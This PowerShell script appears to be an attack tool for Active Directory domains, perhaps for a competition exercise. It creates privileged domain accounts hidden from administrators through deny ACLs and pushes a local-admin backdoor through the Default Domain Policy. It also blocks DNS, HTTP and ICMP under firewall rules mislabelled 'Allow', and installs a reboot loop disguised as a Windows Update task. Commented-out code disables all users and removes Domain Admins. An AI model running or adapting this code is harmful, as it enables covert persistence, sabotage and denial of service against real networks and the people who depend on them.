<#
# Todo: 
[X] AD Account Creation
    * Remove Access via ACL for Domain Admins and Domain Users
    * 
[X] Block Services
    * DNS
    * ICMP
    * HTTP
[] Log Cleanup ? 
    Ownership Permission Attack
    Garbish Text
    File Size Limit
[]  Remove Domain Admins
    * Needs to ensure it doesn't remove the created accounts
[]  Disable All User Accounts
    * Needs to omit Created Users
[X] Create Local Accounts on all Domain Computers
[X] Update the Default Domain GPO
[X]  Create local Account
[X]  Reboot Loop

#>

function createAccount($Name, $Pass, $Group){
    Import-Module ActiveDirectory
    $working_name = $Name -split " " 
    $SAMName = $working_name[0][0] + $working_name[1]
    New-ADUser -Name $SAMname -GivenName $working_name[0] -Surname $working_name[1] -DisplayName $Name -AccountPassword (ConvertTo-SecureString -AsPlainText $Pass -Force) -Description "User Account" -Enabled $true -ChangePasswordAtLogon $false -PasswordNeverExpires $true
    #Set-ADUser -Identity $SAMname -Replace @{showInAdvancedViewOnly='True'}
    Set-ADUser -Enabled $True -Identity $SAMname
    Add-ADGroupMember -Identity $Group -Members $SAMname
    $user = Get-ADUser -Identity $SAMName
    $acl = Get-Acl -Path "AD:\$($user.DistinguishedName)"
    $acl.SetAccessRuleProtection($true,$false)
    $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_)}
    #$acl = New-Object System.Security.AccessControl.DirectoryObjectSecurity
    $domain_admins = Get-ADGroup -Identity "Domain Admins"
    $domain_users = Get-AdGroup -Identity "Domain Users"
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domain_admins.SID,
            [System.DirectoryServices.ActiveDirectoryRights]::Delete,
            [System.Security.AccessControl.AccessControlType]::Deny,
            [GUID]"bf9679c0-0de6-11d0-a285-00aa003049e2",
            [DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        #$acl.RemoveAccessRuleAll([System.Security.AccessControl.FileSystemAccessRule]::new($domainAdminsSID, 'ReadProperty', 'Allow'))
    $acl.AddAccessRule($ACE)
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domain_admins.SID,
            [System.DirectoryServices.ActiveDirectoryRights]::GenericRead,
            [System.Security.AccessControl.AccessControlType]::Deny,
            [GUID]"bf9679c0-0de6-11d0-a285-00aa003049e2",
            [DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        #$acl.RemoveAccessRuleAll([System.Security.AccessControl.FileSystemAccessRule]::new($domainAdminsSID, 'ReadProperty', 'Allow'))
    $acl.AddAccessRule($ACE)
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domain_admins.SID,
            [System.DirectoryServices.ActiveDirectoryRights]::ListObject,
            [System.Security.AccessControl.AccessControlType]::Deny,
            [GUID]"bf9679c0-0de6-11d0-a285-00aa003049e2",
            [DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        #$acl.RemoveAccessRuleAll([System.Security.AccessControl.FileSystemAccessRule]::new($domainAdminsSID, 'ReadProperty', 'Allow'))
    $acl.AddAccessRule($ACE)
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domain_users.SID,
            [System.DirectoryServices.ActiveDirectoryRights]::GenericRead,
            [System.Security.AccessControl.AccessControlType]::Deny,
            [GUID]"bf9679c0-0de6-11d0-a285-00aa003049e2",
            [DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        #$acl.RemoveAccessRuleAll([System.Security.AccessControl.FileSystemAccessRule]::new($domainAdminsSID, 'ReadProperty', 'Allow'))
    $acl.AddAccessRule($ACE)
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $domain_users.SID,
            [System.DirectoryServices.ActiveDirectoryRights]::ListObject,
            [System.Security.AccessControl.AccessControlType]::Deny,
            [GUID]"bf9679c0-0de6-11d0-a285-00aa003049e2",
            [DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        #$acl.RemoveAccessRuleAll([System.Security.AccessControl.FileSystemAccessRule]::new($domainAdminsSID, 'ReadProperty', 'Allow'))
    $acl.AddAccessRule($ACE)
    #$denyRuleRead = New-Object System.Security.AccessControl.Ac("Everyone","Read","Deny")
    #$denRuleRead = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($domain_users,"Deny")

    # Add the deny rule for the "ReadProperty" and other read access
    #$acl.AddAccessRule($rule)
    

    # Apply the modified ACL back to the AD object
    Set-Acl -Path "AD:\$($user.DistinguishedName)" -AclObject $acl
    #Remove-ADObjectAclEntry -Identity $SAMName -Account "Domain Users"
    #Remove-ADObjectAclEntry -Identity $SAMName -Account "Domain Admins"
    
    return $SAMName
}
function Create-LocalAdminAccount {
    param(
        [string]$Username,
        [string]$Password
    )
    
    # Check if the local admin account already exists
    $localAdminExists = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
    if ($null -eq $localAdminExists) {
        # Create the local admin account
        New-LocalUser -Name $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName "$Username Local Administrator" -Description "Local Administrator Account"

        # Add the new account to the local Administrators group
        Add-LocalGroupMember -Group "Administrators" -Member $Username
    }

    # Define the PowerShell script content to be run on each machine at startup
    $scriptContent = @"
# PowerShell script to create a local admin account
`$u = '$Username'
`$p = '$Password'

`$localAdmin = Get-LocalUser -Name \$u -ErrorAction SilentlyContinue
if (`$null -eq `$localAdmin) {
    New-LocalUser -Name `$u -Password (ConvertTo-SecureString `$p -AsPlainText -Force) -FullName '`$u Local Administrator' -Description 'Local Administrator Account'
    Add-LocalGroupMember -Group 'Administrators' -Member `$u
}
"@

    # Save the script to a location in the SYSVOL folder (shared location for all domain machines)
    $scriptPath = "\\$env:COMPUTERNAME\SYSVOL\$env:USERDNSDOMAIN\scripts\CreateLocalAdmin.ps1"
    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8

    # Name of the GPO (Default Domain Policy)
    $GPOName = "Default Domain Policy"

    # Get the GPO object for Default Domain Policy
    $GPO = Get-GPO -Name $GPOName

    # Set the PowerShell script to run at startup String
    Set-GPRegistryValue -Name $GPOName -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Type String -ValueName "RunStartupScript" -Value "$scriptPath"

    # Update the GPO to apply immediately
    #gpupdate /force

    #Write-Host "Local Admin account '$Username' has been created and GPO updated."
}
function Create-LocalAdminOnAllComputers {
    param(
        [string]$Username,
        [string]$Password
    )
    
    # Get a list of all domain computers
    $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
    
    # Loop through each computer
    foreach ($computer in $computers) {
        Write-Host "Processing $computer..."

        # Run the script remotely on each computer
        try {
            Invoke-Command -ComputerName $computer -ScriptBlock {
                param (
                    $Username,
                    $Password
                )

                # Check if the local admin account already exists
                $localAdminExists = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
                if ($null -eq $localAdminExists) {
                    # Create the local admin account
                    New-LocalUser -Name $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName "$Username Local Administrator" -Description "Local Administrator Account"

                    # Add the new account to the local Administrators group
                    Add-LocalGroupMember -Group "Administrators" -Member $Username
                }
            } -ArgumentList $Username, $Password -Credential New-Object System.Manageme -ErrorAction Stop

            Write-Host "Local Admin account '$Username' created successfully on $computer"
        }
        catch {
            Write-Host "Failed to create Local Admin account on computer: $_"
        }
    }
}

createAccount -Name "Malcolm Reynolds" -Pass "P@ssw0rd123" -Group "Domain Admins"
createAccount -Name "Hoban Wash" -Pass "P@ssw0rd123" -Group "Domain Admins"
createAccount -Name "River Tam" -Pass "P@ssw0rd123" -Group "Enterprise Admins"
createAccount -Name "Jayne Cobb" -Pass "P@ssw0rd123" -Group "DnsAdmins"
createAccount -Name "Simon Tam" -Pass "P@ssw0rd123" -Group "Server Operators"
createAccount -Name "Zoe Washburne" -Pass "P@ssw0rd123" -Group "Schema Admins"
Create-LocalAdminAccount -Username "Inara" -Password "P@ssw0rd123"
#Create-LocalAdminOnAllComputers -Username "Book" -Password "P@ssw0rd123"


$fw = @{
    DisplayName = "Allow inbound ICMP"
    Direction = "Inbound"
    Protocol = "ICMPv4"
    ICMPType = 8
    Action = "Block"
}
New-NetFirewallRule @fw
$fw = @{
    DisplayName = "Allow inbound HTTP"
    Direction = "Inbound"
    Protocol = "TCP"
    LocalPort = 80
    Action = "Block"
}
New-NetFirewallRule @fw
$fw = @{
    DisplayName = "Allow inbound DNS"
    Direction = "Inbound"
    Protocol = "UDP"
    LocalPort = 53
    Action = "Block"
}
New-NetFirewallRule @fw

## DISABLE ALL ACCOUNTS
#Get-ADUser -Filter * | ForEach {  Set-ADUser -Enabled $False -Identity $_.SamAccountName}

## REBOOT MINE
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command Restart-Computer"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Check Widnows Update At Startup" -Action $action -Trigger $trigger -Force

## Remove ALL Domain Admins
#$domainAdmins = Get-ADGroupMember -Identity "Domain Admins" 
#foreach ($user in $domainAdmins) {
#    Remove-ADGroupMember -Identity "Domain Admins" -Members $user -Confirm:$false
#    Write-Host "Removed $($user.SamAccountName) from Domain Admins"
#}